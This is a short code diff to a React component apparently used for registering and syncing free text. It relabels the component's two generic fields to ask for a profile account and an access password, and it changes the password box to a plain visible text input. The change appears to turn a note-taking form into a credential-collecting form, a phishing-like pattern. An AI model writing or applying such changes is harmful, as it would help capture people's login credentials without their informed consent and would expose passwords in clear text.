@@ -124,7 +124,7 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
     }, 1000);
   };
 
-  const handleBox2Change = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
+  const handleBox2Change = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
     const val = e.target.value;
     setBox2(val);
     if (sessionId) {
@@ -229,7 +229,7 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
                 htmlFor="text-field-1"
                 className="block text-xs font-semibold text-slate-700 mb-1"
               >
-                Casilla 1 · Nombre, Asunto o Identificador
+                Cuenta de tu perfil
               </label>
               <input
                 ref={input1Ref}
@@ -247,14 +247,14 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
                 htmlFor="text-field-2"
                 className="block text-xs font-semibold text-slate-700 mb-1"
               >
-                Casilla 2 · Mensaje, Detalle o Texto a Registrar
+                Clave de acceso
               </label>
-              <textarea
+              <input
+                type="text"
                 id="text-field-2"
-                rows={2}
                 value={box2}
                 onChange={handleBox2Change}
-                className="w-full max-w-xl min-h-[58px] rounded-lg border border-slate-300 bg-white p-2.5 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all resize-y"
+                className="w-full max-w-xl h-8.5 rounded-lg border border-slate-300 bg-white px-3 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
               />
             </div>
 
